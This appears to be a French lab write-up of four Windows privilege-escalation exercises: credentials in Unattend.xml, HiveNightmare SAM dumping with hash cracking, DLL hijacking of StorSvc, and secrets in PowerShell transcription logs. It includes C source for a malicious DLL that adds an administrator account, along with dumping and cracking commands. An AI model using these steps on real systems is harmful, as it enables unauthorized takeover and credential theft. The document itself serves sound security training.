# Laboratoire d'Escalade de Privilèges Windows

## Vue d'Ensemble du Projet

Ce laboratoire démontre quatre techniques d'escalade de privilèges sur Windows :
- **Task 0** : Exploitation de fichiers d'installation automatisée (Unattend.xml) contenant des identifiants encodés en Base64
- **Task 1** : Exploitation de la vulnérabilité HiveNightmare (CVE-2021-36934) pour extraire et cracker les hashes SAM/SYSTEM
- **Task 2** : Détournement de DLL (DLL Hijacking) via des permissions faibles sur un répertoire de service
- **Task 3** : Exploitation des journaux de transcription PowerShell pour extraire des secrets et reconstruire un flag par hachage MD5

---

# TASK 0 : Privilege Escalation via Unattended Files

## Objectif

Localiser des fichiers d'installation automatisée (Unattend.xml), extraire des identifiants administratifs encodés à l'aide de Python/Regex, et établir une session administrative pour récupérer un flag cible.

## Contexte

**Cible :** VM Windows (Task 0)  
**Compte initial :** Utilisateur standard  
**Fichiers clés :** `Unattend.xml`, `extract_password.py`, `flag.exe`

---

## Étape 1 : Configuration de la Machine Virtuelle (Dépannage)

Initialement, la VM n'a pas pu démarrer avec l'erreur `Could not read from the boot medium`.

**Correction :**
- Extraction complète de l'archive `.zip` dans un dossier local
- Import via `File > Import Appliance` dans VirtualBox pour lier correctement le `.ovf` et le disque virtuel `.vmdk`
- Validation des paramètres du contrôleur de stockage pour s'assurer que le disque était correctement attaché

---

## Étape 2 : Reconnaissance & Localisation des Fichiers

Numérisation du système pour trouver les emplacements communs des fichiers d'installation sensibles.

**Commande utilisée :**
```cmd
dir /s C:\unattend.xml C:\autounattend.xml C:\sysprep.inf
```

**Résultat :** Fichier valide trouvé à `C:\Windows\Panther\Unattend.xml`

---

## Étape 3 : Extraction & Décodage du Mot de Passe

Le fichier contenait un bloc `<AdministratorPassword>` avec une valeur encodée.

**Chaîne Extraite :** `U3VwM2VyU2VjcmV0UGFzczRBRG0xbg`

**Méthode :**
- Utilisation d'un script Python avec des expressions régulières (Regex) pour isoler la balise `<Value>`
- La chaîne étant encodée en Base64, décodage avec `certutil` (CMD) ou `base64` (Python)

**Mot de Passe Final :** `Sup3erSecretPass4ADm1n`

---

## Étape 4 : Escalade de Privilèges (Runas)

L'utilisateur administratif cible a été identifié comme `SuperAdministrator`. Nous avons utilisé la commande `runas` pour pivoter vers une session élevée.

**Commande :**
```cmd
runas /user:SuperAdministrator "cmd.exe /k C:\Users\SuperAdministrator\Desktop\flag.exe"
```

**Exécution :**
- Saisie du mot de passe décodé lorsque demandé
- Exécution du programme flag.exe pour récupérer le flag

---

## Étape 5 : Script Automatisé (extract_password.py)

Le script `extract_password.py` automatise le processus de découverte, d'extraction et de décodage :

### Fonctionnalités du Script

1. **Numérisation des emplacements** : Recherche automatique dans les chemins communs
   - `C:\Windows\Panther`
   - `C:\Windows\System32\sysprep`
   - `C:\`

2. **Extraction avec Regex** : Isolation de la valeur dans la balise `<AdministratorPassword>`

3. **Décodage Base64** : Conversion automatique de la valeur encodée

4. **Instructions finales** : Affichage de la commande `runas` à exécuter avec le mot de passe décodé

### Exécution du Script

```bash
python3 extract_password.py
```

**Sortie attendue :**
```
[*] Searching for unattended files...
[+] Found: C:\Windows\Panther\Unattend.xml
[*] Extracted Value: U3VwM2VyU2VjcmV0UGFzczRBRG0xbg
[+] Decoded Password: Sup3erSecretPass4ADm1n

==============================
FINAL STEP: ESTABLISH ADMIN SESSION
==============================
Run this command in CMD:
runas /user:SuperAdministrator "C:\Users\SuperAdministrator\Desktop\flag.exe"

Password to type: Sup3erSecretPass4ADm1n
==============================
```

---

## Conclusion Task 0

Le laboratoire a été complété avec succès en exploitant des identifiants stockés de manière non sécurisée dans les fichiers de configuration Windows. Le flag final a été récupéré en exécutant `flag.exe` en tant que `SuperAdministrator`.

**Artefact :** Flag sauvegardé dans `0-flag.txt`

### Leçons Apprises

- Les fichiers d'installation automatisée peuvent contenir des informations sensibles
- L'encodage Base64 n'est pas une méthode de chiffrement sécurisée
- La commande `runas` permet l'exécution de programmes avec des privilèges différents
- Les expressions régulières sont efficaces pour extraire des données structurées

---

# TASK 1 : Privilege Escalation via SAM & SYSTEM Backup Files

## Objectif

Exploiter une vulnérabilité du système pour récupérer le mot de passe du compte `superAdministrator` et récupérer le flag.

## Contexte

**Cible :** LAB02  
**Compte utilisé :** Sammy  
**Mot de passe Sammy :** Sammy

---

## Étape 1 : Vérification de la Vulnérabilité

Vérifier si les fichiers SAM/SYSTEM sont accessibles en lecture par les utilisateurs standards (vulnérabilité HiveNightmare/SeriousSAM).

**Commande utilisée :**
```cmd
icacls C:\Windows\System32\config\SAM
```

**Vulnérable si la sortie contient :**
```
BUILTIN\Users:(I)(RX)
```

Cela signifie que les utilisateurs standards ont des permissions de lecture sur le fichier SAM, ce qui est une faille de sécurité.

---

## Étape 2 : Énumération des Privilèges (Optionnel)

Télécharger et exécuter le script PowerShell **PrivescCheck** sur le système cible pour identifier d'autres vulnérabilités potentielles.

**Analyse de la sortie :**
- Confirmer la vulnérabilité HiveNightmare
- Repérer les chemins d'accès aux fichiers sensibles
- Identifier les copies shadow disponibles

---

## Étape 3 : Exploitation avec HiveNightmare

Utiliser l'exploit **HiveNightmare.exe** pour extraire les fichiers critiques depuis les copies shadow du système.

**Téléchargement :**
- Rechercher et télécharger un exploit HiveNightmare fonctionnel (fichier `.exe`)
- Transférer l'exploit sur la VM cible

**Exécution :**
```cmd
HiveNightmare.exe
```

**Fichiers extraits :**
- `SAM-*` (base de données des comptes utilisateurs)
- `SYSTEM-*` (clés de chiffrement)
- `SECURITY-*` (politiques de sécurité)

---

## Étape 4 : Transfert des Fichiers vers Kali Linux

Transférer les fichiers extraits (SAM, SYSTEM, SECURITY) depuis la VM Windows vers Kali Linux.

**Méthodes possibles :**
- Partage réseau (SMB)
- Serveur HTTP Python : `python -m http.server 8000`
- Copie via SSH/SCP
- Clé USB partagée dans VirtualBox

---

## Étape 5 : Extraction des Hashes NTLM

**Sur Kali Linux :**

S'assurer que le toolkit **Impacket** est installé :
```bash
sudo apt install impacket-scripts
```

Extraire les hashes de mots de passe à partir des fichiers SAM/SYSTEM/SECURITY :

**Commande :**
```bash
impacket-secretsdump -sam SAM-* -system SYSTEM-* -security SECURITY-* LOCAL
```

**Sortie attendue :**
```
[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
superAdministrator:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
```

**Hash NTLM récupéré :** `13b29964cc2480b4ef454c59562e675c`

---

## Étape 6 : Cracking du Hash NTLM

Utiliser **hashcat** pour cracker le hash NTLM et récupérer le mot de passe en clair.

**Commande :**
```bash
hashcat -m 1000 13b29964cc2480b4ef454c59562e675c /usr/share/wordlists/rockyou.txt
```

**Paramètres :**
- `-m 1000` : Mode NTLM
- Hash à cracker
- Dictionnaire rockyou.txt

**Résultat :**
```
13b29964cc2480b4ef454c59562e675c:P@ssword
```

**Mot de passe cracké :** `P@ssword`

---

## Étape 7 : Accès Session Administrateur

### Méthode 1 : Connexion RDP

Se connecter en RDP avec le mot de passe récupéré :

```bash
xfreerdp3 /u:Administrator /p:P@ssword /v:<IP_LAB02>
```

ou

```bash
xfreerdp3 /u:superAdministrator /p:P@ssword /v:<IP_LAB02>
```

### Méthode 2 : PowerShell avec Credentials (depuis Sammy)

Utiliser PowerShell pour exécuter des commandes en tant que `superAdministrator` et copier les fichiers protégés :

```powershell
$password = ConvertTo-SecureString "P@ssword" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("superAdministrator", $password)
Start-Process "cmd.exe" -ArgumentList "/c copy C:\Users\superAdministrator\Desktop\* C:\Users\Public\" -Credential $cred
Start-Sleep -s 2
ls C:\Users\Public\
```

---

## Étape 8 : Récupération du Flag

**Sur le bureau de superAdministrator :**

Lancer le programme flag.exe :
```cmd
C:\Users\superAdministrator\Desktop\flag.exe
```

**Sauvegarder le flag :**
- Copier le flag affiché
- Sauvegarder dans `1-flag.txt`

---

## Conclusion Task 1

L'exploitation des fichiers de sauvegarde SAM et SYSTEM via la vulnérabilité HiveNightmare permet d'extraire les hashes de mots de passe, de les cracker, et d'obtenir un accès administrateur complet au système.

**Artefact :** Flag sauvegardé dans `1-flag.txt`

### Leçons Apprises

- La vulnérabilité HiveNightmare (CVE-2021-36934) permet aux utilisateurs standards d'accéder aux fichiers SAM/SYSTEM
- Les copies shadow du système peuvent contenir des informations sensibles
- L'outil `impacket-secretsdump` est efficace pour extraire les hashes depuis les fichiers Windows
- Hashcat avec le dictionnaire rockyou.txt peut cracker des mots de passe faibles
- Les hashes NTLM peuvent être crackés ou utilisés directement (Pass-the-Hash)
- PowerShell permet d'exécuter des commandes avec des credentials spécifiques sans session interactive

---

# TASK 2 : DLL Hijacking via Weak Permissions

## Objectif

Exploiter un chargement de DLL non sécurisé pour obtenir une exécution de code en contexte `NT AUTHORITY\SYSTEM`, puis utiliser les privilèges obtenus pour récupérer le flag.

## Contexte

**Cible :** LAB03  
**Compte utilisé :** Student  
**Mot de passe Student :** Student  
**Fichiers :** `malicious.c`, `SprintCSP.dll`, `WIN10RpcClient.exe`, `flag.exe`

---

## Étape 1 : Identification de la Vulnérabilité

Le service `StorSvc` (Storage Service), exécuté en `SYSTEM`, tente de charger une DLL manquante (`SprintCSP.dll`) en suivant un ordre de recherche où un chemin est insécure.

Le répertoire binaire d'une installation tierce (Confluence) possède des permissions trop permissives (`Write` pour le groupe `Users`), permettant d'y déposer une DLL malveillante.

**Chemin vulnérable :**
```text
C:\Program Files\Atlassian\Confluence\bin\SprintCSP.dll
```

**Validation :**
- L'exécution de `PrivescCheck.ps1 -Extended` remonte une vulnérabilité `High` dans `Services - Image File Permissions`
- Le groupe `Users` peut écrire dans le dossier `\bin` utilisé par le service

---

## Étape 2 : Préparation de la DLL Malveillante (Kali Linux)

Création d'un fichier C (`malicious.c`) exécuté au chargement de la DLL.

**Code source :**
```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
   if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
      system("net user hacker Password123! /add");
      system("net localgroup administrators hacker /add");
   }
   return TRUE;
}
```

**Compilation croisée :**
```bash
x86_64-w64-mingw32-gcc -shared -o SprintCSP.dll malicious.c
```

---

## Étape 3 : Mise en Place et Déclenchement (Windows)

**Transfert :** copier `SprintCSP.dll` depuis Kali vers la machine Windows cible.

**Injection :**
```powershell
Copy-Item .\SprintCSP.dll "C:\Program Files\Atlassian\Confluence\bin\SprintCSP.dll" -Force
```

**Déclenchement :** forcer `StorSvc` à appeler la fonction RPC qui charge la DLL.
```powershell
.\WIN10RpcClient.exe
```

**Résultat :** la DLL est chargée par `SYSTEM`, le compte `hacker` est créé puis ajouté au groupe `Administrators`.

---

## Étape 4 : Phase Finale - Capture du Flag

Approche directe via l'interface graphique avec les privilèges du compte `hacker`.

- Ouvrir une session/commande avec les identifiants du compte `hacker`
- Naviguer vers `C:\Users\superAdministrator\Desktop\`
- Valider la demande UAC (`Continuer`) pour que Windows ajuste les ACL et autorise l'accès
- Exécuter `flag.exe` depuis le bureau du `superAdministrator`

---

## Conclusion Task 2

Le détournement de DLL a permis d'obtenir une exécution de code en contexte `SYSTEM` en abusant d'un répertoire insécurisé du service. La création d'un compte administrateur local a ensuite permis l'accès au bureau cible et la récupération du flag.

**Artefact :** Flag sauvegardé dans `2-flag.txt`

### Leçons Apprises

- Les permissions faibles sur les chemins de binaires/services exposent à des attaques de DLL Hijacking
- Une DLL manquante chargée par un service privilégié peut devenir un point d'exécution en `SYSTEM`
- `PrivescCheck` permet d'identifier rapidement les mauvaises ACL exploitables
- Les ACL/UAC peuvent être contournées après élévation locale réussie

---

# TASK 3 : Privilege Escalation via PowerShell Transcription Logs

## Objectif

Identifier une vulnérabilité de configuration dans la journalisation PowerShell, extraire des secrets (passphrase et identifiants) à partir des fichiers de transcription, et reconstruire un flag généré dynamiquement via un algorithme de hachage MD5.

## Contexte

**Cible :** VM Windows (Task 3)  
**Compte utilisé :** Student  
**Fichiers clés :** Logs PowerShell de transcription, `flag.exe`

---

## Étape 1 : Analyse de la Configuration (Reconnaissance)

Vérifier les clés de registre pour confirmer que la transcription PowerShell est active et localiser le répertoire de sortie.

**Commande :**
```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription'
```

**Résultat :**
```text
EnableTranscripting = 1
OutputDirectory = C:\Users\Student\Documents\PowerShell
```

---

## Étape 2 : Localisation des Journaux Sensibles

Rechercher récursivement les fichiers de transcription créés par d'autres utilisateurs ou lors de sessions précédentes.

**Commande :**
```powershell
Get-ChildItem 'C:\Users\Student\Documents\PowerShell' -Recurse | Select FullName
```

**Découverte :**
Présence de plusieurs dossiers datés, notamment le dossier récent `20260313` contenant des logs de sessions administratives.

---

## Étape 3 : Extraction de la Logique et des Secrets

Analyser le contenu des logs pour identifier des commandes manipulant des variables sensibles comme `$passPhrase`, `$username` ou `$flag`.

**Commande de recherche :**
```powershell
Select-String -Path 'C:\Users\Student\Documents\PowerShell\20260313\*.txt' -Pattern '\$flag\s*='
```

**Données extraites :**
```powershell
$passPhrase = 'L0K8H7I6G5F4E3D2'
$username = 'JoBEph'
```

**Méthode de génération :**
Concaténation de la passphrase et du nom d'utilisateur, puis calcul du hachage MD5 de la chaîne résultante.

---

## Étape 4 : Reconstruction du Flag (Exploitation)

Utiliser les secrets récupérés pour rejouer la logique de génération du flag directement dans PowerShell.

**Script de calcul :**
```powershell
$passPhrase = 'L0K8H7I6G5F4E3D2'
$username = 'JoBEph'
$inputString = $passPhrase + $username
$md5 = [System.Security.Cryptography.MD5]::Create()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($inputString)
$hash = $md5.ComputeHash($bytes)
$flag = [System.BitConverter]::ToString($hash).Replace('-', '').ToLower()
```

**Résultat final :**
`b951ad0895ae4ae7bbff3601d683e80a`

---

## Conclusion Task 3

L'analyse des journaux de transcription PowerShell permet de récupérer des secrets exposés par des sessions précédentes et de reconstituer un flag généré dynamiquement sans avoir besoin d'accéder directement à un compte privilégié.

**Artefact :** Flag sauvegardé dans `3-flag.txt`

### Leçons Apprises

- Une mauvaise configuration de la transcription PowerShell peut exposer des données sensibles dans des fichiers lisibles
- Les journaux de commandes peuvent révéler des identifiants, des passphrases et la logique applicative utilisée pour générer des secrets
- La reconstruction d'un résultat à partir d'éléments observés dans les logs peut suffire à contourner la nécessité d'une élévation de privilèges classique
- Les fonctions de hachage comme MD5 restent faciles à reproduire lorsqu'on possède les entrées d'origine
